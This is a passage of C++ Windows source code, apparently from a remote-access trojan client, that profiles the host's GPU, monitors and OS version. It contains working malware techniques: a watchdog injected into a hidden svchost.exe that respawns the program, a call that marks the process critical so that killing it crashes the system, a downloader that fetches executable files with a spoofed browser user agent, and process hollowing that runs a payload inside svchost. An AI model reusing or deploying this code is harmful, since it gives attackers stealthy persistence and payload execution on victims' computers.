	__finally
	{
		RegCloseKey(MainKey);
		RegCloseKey(hKey);
	}


	return iResult;
}


// ��ȡGPU��Ϣ  ��ʾ��
void getgpuandMonitor(TCHAR* p_buf, TCHAR* p_Monitorbuf)
{
	// ������� 
	IDXGIFactory* pFactory;
	IDXGIAdapter* pAdapter;
	std::vector <IDXGIAdapter*> vAdapters;
	int iAdapterNum = 0;

	// ����һ��DXGI����  
	HRESULT hr = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)(&pFactory));

	if (FAILED(hr))
		return;
	// ö��������  
	while (pFactory->EnumAdapters(iAdapterNum, &pAdapter) != DXGI_ERROR_NOT_FOUND)
	{
		vAdapters.push_back(pAdapter);
		++iAdapterNum;
	}
	for (size_t i = 0; i < vAdapters.size(); i++)
	{
		if (i>2) break;
	
		DXGI_ADAPTER_DESC adapterDesc;
		vAdapters[i]->GetDesc(&adapterDesc);
		swprintf_s(p_buf, 150, _T("%s%s %d %d "), p_buf, adapterDesc.Description, adapterDesc.DedicatedVideoMemory / 1024 / 1024, adapterDesc.VendorId);

		// ����豸  
		IDXGIOutput* pOutput;
		std::vector<IDXGIOutput*> vOutputs;
		// ����豸����  
		int iOutputNum = 0;
		while (vAdapters[i]->EnumOutputs(iOutputNum, &pOutput) != DXGI_ERROR_NOT_FOUND)
		{
			vOutputs.push_back(pOutput);
			iOutputNum++;
		}

		for (size_t n = 0; n < vOutputs.size(); n++)
		{
			// ��ȡ��ʾ�豸��Ϣ  
			DXGI_OUTPUT_DESC outputDesc;
			vOutputs[n]->GetDesc(&outputDesc);

			// ��ȡ�豸֧��  
			UINT uModeNum = 0;
			DXGI_FORMAT format = DXGI_FORMAT_R8G8B8A8_UNORM;
			UINT flags = DXGI_ENUM_MODES_INTERLACED;

			vOutputs[n]->GetDisplayModeList(format, flags, &uModeNum, 0);
			DXGI_MODE_DESC* pModeDescs = new DXGI_MODE_DESC[uModeNum];
			vOutputs[n]->GetDisplayModeList(format, flags, &uModeNum, pModeDescs);

			swprintf_s(p_Monitorbuf, 255, _T("%s%s %d*%d "), p_Monitorbuf, outputDesc.DeviceName, outputDesc.DesktopCoordinates.right - outputDesc.DesktopCoordinates.left, outputDesc.DesktopCoordinates.bottom - outputDesc.DesktopCoordinates.top);
			SAFE_DELETE(pModeDescs);
		
		}
		vOutputs.clear();
	}
	vAdapters.clear();
}


//�жϲ���ϵͳ�Ƿ�Ϊ64λ
BOOL IsWindowsX64()
{
	typedef void (WINAPI* PGNSI)(LPSYSTEM_INFO);
	SYSTEM_INFO si = { 0 };
	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	PGNSI pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else
		GetSystemInfo(&si);

	if (PROCESSOR_ARCHITECTURE_IA64 == si.wProcessorArchitecture ||
		PROCESSOR_ARCHITECTURE_AMD64 == si.wProcessorArchitecture)
	{
		return TRUE;
	}

	return FALSE;
}


//��ȡϵͳ�汾��
void GetNtVersionNumbers(TCHAR* OSVersion, TCHAR* OsName)
{
	DWORD dwMajorVer; DWORD dwMinorVer; DWORD dwBuildNumber;
	HMODULE hModNtdll = NULL;

	if (hModNtdll = ::LoadLibraryW(L"ntdll.dll"))
	{
		typedef void (WINAPI* pfRTLGETNTVERSIONNUMBERS)(DWORD*, DWORD*, DWORD*);
		pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
		pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
		if (pfRtlGetNtVersionNumbers)
		{
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer, &dwBuildNumber);
			dwBuildNumber &= 0x0ffff;
			swprintf_s(OSVersion, 30, _T("%d.%d.%d"), dwMajorVer, dwMinorVer, dwBuildNumber);

			HKEY hKey;
			DWORD dwSize = 202;
			TCHAR* lpProductName = new TCHAR[dwSize];  //  �洢ϵͳ����
			DWORD dwDataType = REG_SZ;
			LPCTSTR subKey = _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
			long errorCode;

			if (IsWindowsX64())
			{
				errorCode = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, NULL, KEY_READ | KEY_WOW64_64KEY, &hKey);
			}
			else
			{
				errorCode = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, NULL, KEY_READ, &hKey);
			}
			if ((ERROR_SUCCESS == RegQueryValueEx(hKey, _T("ProductName"), NULL, &dwDataType, (LPBYTE)lpProductName, &dwSize)) &&
				(ERROR_SUCCESS == errorCode))
			{
				wcsncpy_s(OsName, 50, (TCHAR*)lpProductName, 49);
			}
			RegCloseKey(hKey);

			delete[] lpProductName;

		}
		::FreeLibrary(hModNtdll);
	}


	return;
}



LONG WINAPI My_bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	Trace("bad_exception");
	// �����쳣�����´�������
	PROCESS_INFORMATION   info;
	STARTUPINFO startup;
	TCHAR szPath[255];
	TCHAR* szCmdLine;
	GetModuleFileName(NULL, szPath, sizeof(szPath));
	szCmdLine = GetCommandLine();
	GetStartupInfo(&startup);
	BOOL   bSucc = CreateProcess(szPath, szCmdLine, NULL, NULL,
		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &info);
	ExitProcess(-1);
	ExitProcess(0);
	return 0;
}


char* TCHAR2char(const TCHAR* m_str)    //�������� ����ֱ��ʹ�� ֻ���ô��� ��Ҫ�ͷ� str
{
	int size = WideCharToMultiByte(CP_ACP, 0, m_str, -1, NULL, 0, NULL, FALSE);
	char* str = new char[sizeof(char) * size];
	WideCharToMultiByte(CP_ACP, 0, m_str, -1, str, size, NULL, FALSE);
	return str;
}

TCHAR* char2TCAHR(const char* str)
{
	int size = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
	TCHAR* retStr = new TCHAR[size * sizeof(TCHAR)];
	MultiByteToWideChar(CP_ACP, 0, str, -1, retStr, size);
	return retStr;
}


typedef enum _PROCESS_INFORMATION_CLASS {
	ProcessMemoryPriority,
	ProcessMemoryExhaustionInfo,
	ProcessAppMemoryInfo,
	ProcessInPrivateInfo,
	ProcessPowerThrottling,
	ProcessReservedValue1,
	ProcessTelemetryCoverageInfo,
	ProcessProtectionLevelInfo,
	ProcessLeapSecondInfo,
	ProcessMachineTypeInfo,
	ProcessInformationClassMax
} PROCESS_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
	HANDLE ProcessHandle,
	PROCESS_INFORMATION_CLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength);

BOOL CallNtSetinformationProcess()
{
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		CloseHandle(hToken);
	}
	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess");
	if (!NtSetInformationProcess)
	{
		return 0;
	}
	HANDLE hProcess;
	ULONG Flag = 1;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, _getpid());
	NtSetInformationProcess(hProcess, (PROCESS_INFORMATION_CLASS)29, &Flag, sizeof(ULONG));
	return 1;
}






//Զ���̺߳����� (�ػ�����)
DWORD WINAPI ThreadProc(RemoteParam* lprp)
{
	typedef UINT(WINAPI* ZWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
	typedef HANDLE(WINAPI* ZOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	typedef VOID(WINAPI* ZExitProcess)(UINT uExitCode);
	typedef DWORD(WINAPI* ZWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
	ZWinExec ZWE;
	ZOpenProcess ZOP;
	ZExitProcess ZEP;
	ZWaitForSingleObject ZWFSO;

	ZWE = (ZWinExec)lprp->ZWinExec;
	ZOP = (ZOpenProcess)lprp->ZOpenProcess;
	ZEP = (ZExitProcess)lprp->ZExitProcess;
	ZWFSO = (ZWaitForSingleObject)lprp->ZWaitForSingleObject;
	lprp->ZProcessHandle = ZOP(PROCESS_ALL_ACCESS, FALSE, lprp->ZPid);
	ZWFSO(lprp->ZProcessHandle, INFINITE);
	ZWE(lprp->filePath, SW_SHOW);
	ZEP(0);
	return 0;
}

//��ȡȨ��
int __cdecl EnableDebugPriv(const TCHAR* name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken)) return 1;
	if (!LookupPrivilegeValue(NULL, name, &luid)) return 1;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;
	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) return 1;
	return 0;
}





bool pid_is_running(DWORD pid) {

	HANDLE h_process = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	if (h_process == NULL) return false;

	DWORD exit_code;
	if (!GetExitCodeProcess(h_process, &exit_code)) return false;

	if (exit_code == STILL_ACTIVE)
		return true;
	else
		return false;
}



bool openandeinject(PROCESS_INFORMATION* pi)
{
	//�򿪽���
	STARTUPINFOA si = { 0 };
	BOOL bRet = FALSE;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(pi, sizeof(pi));
	si.lpReserved = NULL;
	si.lpDesktop = NULL;
	si.lpTitle = NULL;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.cb = sizeof(si);

	char syspath[255] = { 0 };
	GetSystemDirectoryA(syspath, sizeof(syspath));
	syspath[3] = 0x00;
#ifdef _WIN64
	sprintf_s(syspath, "%s%s", syspath, "Windows\\System32\\svchost.exe");
#else
	sprintf_s(syspath, "%s%s", syspath, "Windows\\SysWOW64\\svchost.exe");
	if (GetFileAttributesA(syspath) == INVALID_FILE_ATTRIBUTES)
	{
		syspath[3] = 0x00;
		sprintf_s(syspath, "%s%s", syspath, "Windows\\System32\\svchost.exe");
	}
#endif

	bRet = CreateProcessA(NULL, syspath, NULL, NULL, FALSE, CREATE_NEW_PROCESS_GROUP | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, pi);
	if (FALSE == bRet)  return false;
	if (EnableDebugPriv(SE_DEBUG_NAME)) return  false;
	HANDLE hWnd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->dwProcessId);
	if (!hWnd) return false;
	RemoteParam rp;
	ZeroMemory(&rp, sizeof(RemoteParam));
	rp.ZOpenProcess = (LPVOID)GetProcAddress(LoadLibraryA("Kernel32.dll"), "OpenProcess");
	rp.ZExitProcess = (LPVOID)GetProcAddress(LoadLibraryA("Kernel32.dll"), "ExitProcess");
	rp.ZWinExec = (LPVOID)GetProcAddress(LoadLibraryA("Kernel32.dll"), "WinExec");
	rp.ZWaitForSingleObject = (LPVOID)GetProcAddress(LoadLibraryA("Kernel32.dll"), "WaitForSingleObject");
	rp.ZPid = GetProcessId(GetCurrentProcess());
	CHAR szPath[250] = "\0";
	GetModuleFileNameA(NULL, szPath, sizeof(szPath));
	sprintf_s(rp.filePath, "%s", szPath);
	RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(hWnd, 0, sizeof(RemoteParam), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteParam) return false;

	if (!WriteProcessMemory(hWnd, pRemoteParam, &rp, sizeof(RemoteParam), 0)) return false;
	DWORD lpflOldProtect = 0;
	VirtualProtectEx(hWnd, pRemoteParam, sizeof(RemoteParam), 0x01, &lpflOldProtect);
	LPVOID pRemoteThread = VirtualAllocEx(hWnd, 0, 1024 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread) return false;
	if (!WriteProcessMemory(hWnd, pRemoteThread, &ThreadProc, 1024 * 4, 0)) return false;
	VirtualProtectEx(hWnd, pRemoteThread, 1024 * 4, 0x01, &lpflOldProtect);
	HANDLE hThread = CreateRemoteThread(hWnd, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, (LPVOID)pRemoteParam, 0x00000004, NULL);
	if (!hThread) return false;
	Sleep(60000);
	VirtualProtectEx(hWnd, pRemoteParam, sizeof(RemoteParam), 0x40, &lpflOldProtect);
	VirtualProtectEx(hWnd, pRemoteThread, 1024 * 4, 0x40, &lpflOldProtect);
	ResumeThread(hThread);
	return true;
}



unsigned int __stdcall loactThreadProc(_In_ LPVOID lpParameter)
{
	PROCESS_INFORMATION* pi = (PROCESS_INFORMATION*)lpParameter;
	do
	{
		if (pid_is_running(pi->dwProcessId))
			Sleep(300);
		else
			openandeinject(pi);
	} while (1);
	return 0;
}

BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}

int memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = (int)strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}



bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
{
	HINTERNET	hInternet = NULL, hUrl = NULL;
	HANDLE		hFile;
	TCHAR		buffer[1024];
	DWORD		dwBytesRead = 0;
	DWORD		dwBytesWritten = 0;
	BOOL		bIsFirstPacket = true;
	bool		bRet = true;
	HINSTANCE hdlldes = LoadLibrary(_T("wininet.dll"));
	typedef HINTERNET(WINAPI* NETOPEN)(LPCTSTR, DWORD, LPCTSTR, LPCTSTR, DWORD);
	NETOPEN myNetOpen = (NETOPEN)GetProcAddress(hdlldes, "InternetOpenW");
	hInternet = myNetOpen(_T("MSIE 6.0"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	if (hInternet == NULL)
	{
		if (hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	typedef HINTERNET(WINAPI* NETOPENURL)(HINTERNET, LPCTSTR, LPCTSTR, DWORD, DWORD, DWORD_PTR);
	NETOPENURL 	myNetOpenUrl = (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlW");
	hUrl = myNetOpenUrl(hInternet, szURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (hUrl == NULL)
	{
		if (hdlldes)
			FreeLibrary(hdlldes);
		return false;
	}
	hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			memset(buffer, 0, sizeof(buffer));
			typedef BOOL(WINAPI* APIS)(HINTERNET, LPVOID, DWORD, LPDWORD);
			APIS myapis;
			myapis = (APIS)GetProcAddress(hdlldes, "InternetReadFile");
			myapis(hUrl, buffer, sizeof(buffer), &dwBytesRead);
			// ���жϵ�һ�����ݰ��ǲ�����Ч��PE�ļ�
			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
			{
				bRet = false;
				break;
			}
			bIsFirstPacket = false;
			WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
		} while (dwBytesRead > 0);
		CloseHandle(hFile);
	}
	Sleep(1);
	typedef BOOL(WINAPI* NETCLOSE)(HINTERNET hInternet);
	NETCLOSE  myNetClose = (NETCLOSE)GetProcAddress(hdlldes, "InternetCloseHandle");
	myNetClose(hUrl);
	myNetClose(hInternet);
	if (hdlldes)
		FreeLibrary(hdlldes);
	return bRet;
}

bool buildremoteprocess(byte* data, int size)
{
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT threadContext = { 0 };
	BOOL bRet = FALSE;
	::RtlZeroMemory(&si, sizeof(si));
	::RtlZeroMemory(&pi, sizeof(pi));
	::RtlZeroMemory(&threadContext, sizeof(threadContext));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	char syspath[255] = { 0 };
	GetSystemDirectoryA(syspath, sizeof(syspath));
	syspath[3] = 0x00;
#ifdef _WIN64
	sprintf_s(syspath, "%s%s", syspath, "Windows\\System32\\svchost.exe");
#else
	sprintf_s(syspath, "%s%s", syspath, "Windows\\SysWOW64\\svchost.exe");
	if (GetFileAttributesA(syspath) == INVALID_FILE_ATTRIBUTES)
	{
		syspath[3] = 0x00;
		sprintf_s(syspath, "%s%s", syspath, "Windows\\System32\\svchost.exe");
	}
#endif
	bRet = CreateProcessA(syspath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (FALSE == bRet) return false;
	byte* lpDestBaseAddr = (byte*)VirtualAllocEx(pi.hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr) return false;
	if (!WriteProcessMemory(pi.hProcess, lpDestBaseAddr, data, size, 0)) return false;
	DWORD lpflOldProtect = 0;
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = ::GetThreadContext(pi.hThread, &threadContext);
	if (FALSE == bRet) return FALSE;
#ifdef _WIN64
	threadContext.Rip = (DWORD64)lpDestBaseAddr;
#else
	threadContext.Eip = (DWORD)lpDestBaseAddr;
#endif

	bRet = ::SetThreadContext(pi.hThread, &threadContext);
	if (FALSE == bRet) return FALSE;
	::ResumeThread(pi.hThread);
	return TRUE;
}


void Getfindinfo(TCHAR* s, const TCHAR* f1, TCHAR* outstring, BOOL* user)
{
	if (outstring)
		ZeroMemory(outstring, lstrlen(outstring) * 2+2);
	int  all, da, i, j;
	all = (int)lstrlen(s);
	da = (int)lstrlen(f1);
	for (i = 0; i < all; i++)
	{
		for (j = 0; j < da; j++)
			if (s[i + j] != f1[j])	break;
		if (j == da)
		{
			i += da;
			int first = i;
			for (; i < all; i++)
			{
				if (s[i] == _T('|'))
				{
					if (outstring)
						memcpy(outstring, s + first, (i - first) * 2);
					else
						if (s[i - 1] == _T('1'))  *user = TRUE;
					return;
				}
			}
		}
	}
}


BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;

	//������
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//��ȡ���ش����ַ���
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), _T("A:\\")) || !lstrcmpi(&(szDriveStr[i]), _T("B:\\"))) { continue; }

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			// ��ѯ Dos �豸��
			if (!QueryDosDevice(szDrive, szDevName, 100)) { return FALSE; }

			// ����
			cchDevName = lstrlen(szDevName);
			if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0) {
				// ����������
				lstrcpy(pszNtPath, szDrive);

				// ����·��
				lstrcat(pszNtPath, pszDosPath + cchDevName);

				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}

// ��ȡ����ȫ·��
BOOL GetProcessFullPath(DWORD dwPID,TCHAR* fullPath) {
	TCHAR		szImagePath[MAX_PATH];
	HANDLE		hProcess;

	// ��ʼ��ʧ��
	if (!fullPath) { return FALSE; }
	fullPath[0] = '\0';

	// ��ȡ���̾��ʧ��
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPID);
	if (!hProcess) { return FALSE; }

	// ��ȡ��������·��ʧ��
	if (!GetProcessImageFileName(
		hProcess,					// ���̾��
		szImagePath,				// ���ս��������ļ�ȫ·����ָ��
		MAX_PATH					// ��������С
	)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	// ·��ת��ʧ��
	if (!DosPathToNtPath(szImagePath, fullPath)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);

	return TRUE;
}



